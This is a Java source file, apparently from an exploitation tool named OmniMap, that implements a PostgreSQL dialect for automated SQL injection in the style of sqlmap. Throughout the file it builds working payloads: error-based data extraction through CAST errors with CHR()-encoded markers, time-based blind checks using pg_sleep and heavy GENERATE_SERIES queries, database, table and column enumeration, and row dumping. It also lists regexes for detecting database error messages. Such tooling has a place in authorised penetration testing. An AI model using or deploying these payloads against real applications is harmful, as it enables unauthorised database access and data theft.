package com.omnistrike.modules.exploit.omnimap.dbms;

import java.util.List;
import java.util.concurrent.ThreadLocalRandom;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

/**
 * PostgreSQL dialect for OmniMap.
 * Uses information_schema, SUBSTRING(), CHR(), pg_sleep(), CASE WHEN for conditionals,
 * and CAST type-conversion errors for error-based extraction.
 */
public class PostgresDialect implements DbmsDialect {

    /** Random markers for error-based extraction (like sqlmap's kb.chars.start/stop) */
    private final String errorPrefixDecoded;
    private final String errorSuffixDecoded;
    private final int errorRandNum;

    public PostgresDialect() {
        this.errorPrefixDecoded = randomMarker(4);
        this.errorSuffixDecoded = randomMarker(5);
        this.errorRandNum = ThreadLocalRandom.current().nextInt(1000, 10000);
    }

    @Override
    public String getErrorPrefixDecoded() { return errorPrefixDecoded; }

    @Override
    public String getErrorSuffixDecoded() { return errorSuffixDecoded; }

    private static String randomMarker(int length) {
        ThreadLocalRandom rng = ThreadLocalRandom.current();
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++) {
            sb.append((char) rng.nextInt(0x71, 0x79));
        }
        return sb.toString();
    }

    /**
     * Convert a marker string to CHR(n)||CHR(n)||... format.
     * Like sqlmap: markers are built from CHR() calls so they only appear
     * in the evaluated error message, NOT in reflected SQL input.
     * This prevents false marker matches when the app reflects the injected query.
     */
    private static String toChrConcat(String s) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < s.length(); i++) {
            if (i > 0) sb.append("||");
            sb.append("CHR(").append((int) s.charAt(i)).append(")");
        }
        return sb.toString();
    }

    @Override
    public String getName() { return "PostgreSQL"; }

    @Override
    public String currentDatabase() {
        return "SELECT current_database()";
    }

    @Override
    public String listDatabases() {
        return "SELECT datname FROM pg_database WHERE datistemplate=false";
    }

    @Override
    public String listTables(String database) {
        return "SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND table_catalog='" + database + "'";
    }

    @Override
    public String listColumns(String database, String table) {
        return "SELECT column_name FROM information_schema.columns WHERE table_catalog='" + database
                + "' AND table_name='" + table + "'";
    }

    @Override
    public String dumpData(String database, String table, List<String> columns, int offset, int limit) {
        String cols = columns.stream()
                .map(c -> "COALESCE(CAST(\"" + c + "\" AS TEXT),CHR(32))")
                .collect(Collectors.joining("||CHR(124)||"));
        return "SELECT " + cols + " FROM \"" + table + "\" LIMIT " + limit + " OFFSET " + offset;
    }

    @Override
    public String charFunction(int ascii) {
        return "CHR(" + ascii + ")";
    }

    @Override
    public String substringFunction(String expr, int pos, int len) {
        return "SUBSTRING((" + expr + ")," + pos + "," + len + ")";
    }

    @Override
    public String lengthFunction(String expr) {
        return "LENGTH((" + expr + "))";
    }

    @Override
    public String sleepFunction(int seconds) {
        return "pg_sleep(" + seconds + ")";
    }

    @Override
    public String ifFunction(String condition, String trueVal, String falseVal) {
        return "CASE WHEN (" + condition + ") THEN " + trueVal + " ELSE " + falseVal + " END";
    }

    @Override
    public String commentSuffix() {
        return "--";
    }

    @Override
    public String concatenate(String... parts) {
        return String.join("||", parts);
    }

    @Override
    public List<String> errorFunctions() {
        // sqlmap PostgreSQL (#19): CAST(CHR(..)||CHR(..)||(query)::text||CHR(..)||CHR(..) AS NUMERIC)
        // Uses CHR() calls for markers so they only appear in the error message output,
        // NOT in reflected SQL. String literals ('prefix') would be visible in reflected
        // SQL and cause false marker matches or truncation issues.
        String pChr = toChrConcat(errorPrefixDecoded);
        String sChr = toChrConcat(errorSuffixDecoded);
        return List.of(
                // Level 1 (#19): CAST with CHR() delimiters — like sqlmap
                errorRandNum + "=CAST((" + pChr + ")||(%s)::text||(" + sChr + ") AS NUMERIC)"
        );
    }

    @Override
    public List<String> errorFunctionsForLevel(int level) {
        // PostgreSQL only has one main error function in sqlmap
        return errorFunctions();
    }

    @Override
    public String heavyQuery(int seconds) {
        // sqlmap format: (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
        // e.g., 5 → GENERATE_SERIES(1,5000000)
        return "(SELECT COUNT(*) FROM GENERATE_SERIES(1," + seconds + "000000))";
    }

    /** Pre-compiled error patterns — sqlmap errors.xml + ORM/framework patterns */
    private static final List<Pattern> ERROR_PATTERNS = List.of(
            // === sqlmap core patterns (errors.xml) ===
            Pattern.compile("PostgreSQL.*?ERROR", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Warning.*?\\Wpg_", Pattern.CASE_INSENSITIVE),
            Pattern.compile("valid PostgreSQL result", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Npgsql\\.", Pattern.CASE_INSENSITIVE),
            Pattern.compile("PG::SyntaxError:", Pattern.CASE_INSENSITIVE),
            Pattern.compile("org\\.postgresql\\.util\\.PSQLException", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ERROR:\\s+syntax error at or near", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ERROR: parser: parse error at or near", Pattern.CASE_INSENSITIVE),
            Pattern.compile("PostgreSQL query failed", Pattern.CASE_INSENSITIVE),
            Pattern.compile("org\\.postgresql\\.jdbc", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Pdo[./_\\\\]Pgsql", Pattern.CASE_INSENSITIVE),
            Pattern.compile("PSQLException", Pattern.CASE_INSENSITIVE),
            // === Native PostgreSQL errors ===
            Pattern.compile("ERROR:\\s+unterminated quoted string", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ERROR:\\s+column \".*?\" does not exist", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ERROR:\\s+relation \".*?\" does not exist", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ERROR:\\s+permission denied for", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ERROR:\\s+invalid input syntax for type", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ERROR:\\s+division by zero", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ERROR:\\s+integer out of range", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ERROR:\\s+value too long for type", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ERROR:\\s+null value in column", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ERROR:\\s+duplicate key value violates", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ERROR:\\s+current transaction is aborted", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ERROR:\\s+deadlock detected", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ERROR:\\s+could not connect to server", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ERROR:\\s+canceling statement due to", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ERROR:\\s+operator does not exist", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ERROR:\\s+function .*? does not exist", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ERROR:\\s+cannot cast type", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ERROR:\\s+missing FROM-clause entry", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ERROR:\\s+subquery must return only one column", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ERROR:\\s+more than one row returned by a subquery", Pattern.CASE_INSENSITIVE),
            Pattern.compile("pg_query\\(\\).*?ERROR", Pattern.CASE_INSENSITIVE),
            Pattern.compile("pg_exec\\(\\).*?ERROR", Pattern.CASE_INSENSITIVE),
            Pattern.compile("pg_prepare\\(\\).*?ERROR", Pattern.CASE_INSENSITIVE),
            // === SQLSTATE codes ===
            Pattern.compile("SQLSTATE\\[42601\\]", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SQLSTATE\\[42P01\\]", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SQLSTATE\\[42703\\]", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SQLSTATE\\[22P02\\]", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SQLSTATE\\[23505\\]", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SQLSTATE\\[08006\\]", Pattern.CASE_INSENSITIVE),
            // === ORM / framework patterns ===
            Pattern.compile("psycopg2\\.(OperationalError|ProgrammingError|IntegrityError)", Pattern.CASE_INSENSITIVE),
            Pattern.compile("asyncpg\\..*?(PostgresSyntaxError|UndefinedTableError)", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ActiveRecord::StatementInvalid.*?PG", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Sequel::DatabaseError.*?PG", Pattern.CASE_INSENSITIVE),
            Pattern.compile("django\\.db\\.utils\\.(ProgrammingError|OperationalError).*?postgres", Pattern.CASE_INSENSITIVE),
            Pattern.compile("sqlalchemy\\.exc\\.(ProgrammingError|OperationalError).*?psycopg", Pattern.CASE_INSENSITIVE),
            Pattern.compile("knex.*?error.*?postgres", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SequelizeDatabaseError.*?postgres", Pattern.CASE_INSENSITIVE),
            Pattern.compile("TypeORMError.*?postgres", Pattern.CASE_INSENSITIVE),
            Pattern.compile("prisma.*?error.*?postgres", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Doctrine\\\\DBAL\\\\Exception.*?postgres", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Illuminate\\\\Database\\\\QueryException.*?pgsql", Pattern.CASE_INSENSITIVE),
            Pattern.compile("org\\.hibernate\\.exception\\.SQLGrammarException.*?postgres", Pattern.CASE_INSENSITIVE),
            Pattern.compile("org\\.jooq\\.exception\\.DataAccessException.*?postgres", Pattern.CASE_INSENSITIVE),
            Pattern.compile("DBD::Pg", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Npgsql\\.PostgresException", Pattern.CASE_INSENSITIVE),
            Pattern.compile("pq:.*?syntax error", Pattern.CASE_INSENSITIVE),
            Pattern.compile("pgx\\..*?ERROR", Pattern.CASE_INSENSITIVE)
    );

    @Override
    public List<Pattern> errorPatterns() {
        return ERROR_PATTERNS;
    }

    @Override
    public String countRows(String database, String table) {
        return "SELECT COUNT(*) FROM \"" + table + "\"";
    }

    @Override
    public String separator() {
        return "CHR(124)";
    }
}
